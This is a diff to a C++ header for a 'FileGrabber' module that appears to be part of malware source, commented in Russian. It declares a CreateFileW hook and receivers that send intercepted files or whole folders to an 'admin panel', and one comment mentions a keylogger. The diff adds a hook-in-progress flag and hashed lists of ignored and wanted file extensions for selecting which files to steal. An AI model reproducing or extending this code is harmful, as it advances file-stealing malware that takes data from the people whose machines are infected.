@@ -41,6 +41,7 @@ namespace FileGrabber {
 	const int CURRFULLNAMEFILE = 0x0080; //возвращает получатель, отправлять в админку с именем файла переданным в CreateFile с полнім путем
 	const int SENDFOLDER = 0x0100; //отсылает папку в которой находится найденный файл, имя папки для кейлогера заносим в nameSend
 	const int IGNOREHOOK = 0x0200; //игнорируем обработку хука
+	const int INHOOK = 0x0400; //идет обработка хука, все остальные файлы игнорируется на это время
 
 	const int MaxIgnoreBeg = 4; //максимальное количество игнорируемых форматов
 	const int MaxLenIgnoreBeg = 4; //максимальная длина метки формата
@@ -56,6 +57,8 @@ namespace FileGrabber {
 		TypeFuncReceiver FuncReceiver; //функция получатель события
 		char ignoreBeg[MaxIgnoreBeg][MaxLenIgnoreBeg]; //игнорирование файлов определенных форматов, у которых в начале стоят символы типа файла (в начале содержимого файла, для архивов, картинок)
 							  //расчет максимум на 4-е формата, конец массива считается пустая строка (ignoreBeg[n][0] == 0)
+		DWORD* ignoreExt; //игнорируемые расширения
+		DWORD* neededExt; //нужные расширения
 	};
 
 	typedef HANDLE (WINAPI *TypeCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
@@ -83,6 +86,8 @@ namespace FileGrabber {
 	Receiver* CreateReceiver();
 	bool AddReceiver( Receiver* );
 	bool AddIgnoreBeg( Receiver*, const char* ); //добавляет игнорируемые форматы файлов, которые указываются в начале файла
+	bool AddIgnoreExt( Receiver*, const DWORD* ); //добавляет массив хешей игнорируемых расширений файлов, должен заканчиваться нулем
+	bool AddNeededExt( Receiver*, const DWORD* ); //добавляет массив хешей нужных нам расширений файлов, должен заканчиваться нулем
 };
 
 #endif //FileGrabberH
